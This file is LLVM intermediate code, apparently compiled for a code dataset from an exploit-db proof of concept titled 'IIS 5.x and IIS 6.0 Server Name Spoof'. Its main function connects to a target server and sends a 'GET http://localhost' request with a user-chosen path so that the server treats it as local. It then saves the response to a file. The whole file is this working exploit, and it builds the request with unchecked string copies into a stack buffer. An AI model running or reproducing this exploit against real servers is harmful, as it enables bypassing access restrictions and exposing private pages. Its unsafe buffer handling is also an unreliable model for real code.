; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1178.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1178.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN_BUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [35 x i8] c"\0A                 Proof of Concept\00", align 1
@.str.1 = private unnamed_addr constant [52 x i8] c"\0A IIS 5.x and IIS 6.0 Server Name Spoof - by Lympex\00", align 1
@.str.2 = private unnamed_addr constant [54 x i8] c"\0AContact: lympex[at]gmail[dot]com - http://l-bytes.tk\00", align 1
@.str.3 = private unnamed_addr constant [55 x i8] c"\0A----------------------------------------------------\0A\00", align 1
@.str.4 = private unnamed_addr constant [40 x i8] c"\0A[+] Usage: %s server.com 80 /test.asp\0A\00", align 1
@.str.5 = private unnamed_addr constant [31 x i8] c"\0A[+] Error connecting to host\0A\00", align 1
@.str.6 = private unnamed_addr constant [17 x i8] c"\0A[+] Connected!\0A\00", align 1
@.str.7 = private unnamed_addr constant [18 x i8] c"received_data.txt\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.9 = private unnamed_addr constant [33 x i8] c"\0A[+] Error saving received data\0A\00", align 1
@.str.10 = private unnamed_addr constant [21 x i8] c"GET http://localhost\00", align 1
@.str.11 = private unnamed_addr constant [12 x i8] c" HTTP/1.0\0A\0A\00", align 1
@Conectado = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [51 x i8] c"\0A[+] Received data, saved in: \22received_data.txt\22\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %10 = load i32, i32* @LEN_BUF, align 4
  %11 = zext i32 %10 to i64
  %12 = call i8* @llvm.stacksave()
  store i8* %12, i8** %6, align 8
  %13 = alloca i8, i64 %11, align 16
  store i64 %11, i64* %7, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.1, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.2, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.3, i64 0, i64 0))
  %18 = load i32, i32* %3, align 4
  %19 = icmp ne i32 %18, 4
  br i1 %19, label %20, label %25

20:                                               ; preds = %2
  %21 = load i8**, i8*** %4, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0), i8* %23)
  store i32 1, i32* %9, align 4
  br label %72

25:                                               ; preds = %2
  %26 = load i8**, i8*** %4, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = load i8**, i8*** %4, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i64 @atoi(i8* %31)
  %33 = trunc i64 %32 to i16
  %34 = call i32 @Conecta(i8* %28, i16 signext %33)
  store i32 %34, i32* %5, align 4
  %35 = load i32, i32* %5, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %39

37:                                               ; preds = %25
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.5, i64 0, i64 0))
  store i32 1, i32* %9, align 4
  br label %72

39:                                               ; preds = %25
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0))
  %41 = call i32* @fopen(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  store i32* %41, i32** %8, align 8
  %42 = icmp eq i32* %41, null
  br i1 %42, label %43, label %46

43:                                               ; preds = %39
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.9, i64 0, i64 0))
  %45 = call i32 (...) @WSACleanup()
  store i32 1, i32* %9, align 4
  br label %72

46:                                               ; preds = %39
  %47 = call i32 @strcpy(i8* %13, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.10, i64 0, i64 0))
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 3
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcat(i8* %13, i8* %50)
  %52 = call i32 @strcat(i8* %13, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.11, i64 0, i64 0))
  %53 = load i32, i32* %5, align 4
  %54 = call i32 @strlen(i8* %13)
  %55 = call i32 @send(i32 %53, i8* %13, i32 %54, i32 0)
  br label %56

56:                                               ; preds = %63, %46
  %57 = load i32, i32* %5, align 4
  %58 = load i32, i32* @LEN_BUF, align 4
  %59 = call i64 @recv(i32 %57, i8* %13, i32 %58, i32 0)
  %60 = getelementptr inbounds i8, i8* %13, i64 %59
  store i8 0, i8* %60, align 1
  %61 = load i32*, i32** %8, align 8
  %62 = call i32 @fputs(i8* %13, i32* %61)
  br label %63

63:                                               ; preds = %56
  %64 = load i32, i32* %5, align 4
  %65 = load i32, i32* @Conectado, align 4
  %66 = icmp eq i32 %64, %65
  br i1 %66, label %56, label %67

67:                                               ; preds = %63
  %68 = call i32 (...) @WSACleanup()
  %69 = load i32*, i32** %8, align 8
  %70 = call i32 @fclose(i32* %69)
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.12, i64 0, i64 0))
  store i32 1, i32* %9, align 4
  br label %72

72:                                               ; preds = %67, %43, %37, %20
  %73 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %73)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @Conecta(i8*, i16 signext) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @WSACleanup(...) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @fputs(i8*, i32*) #2

declare dso_local i32 @fclose(i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
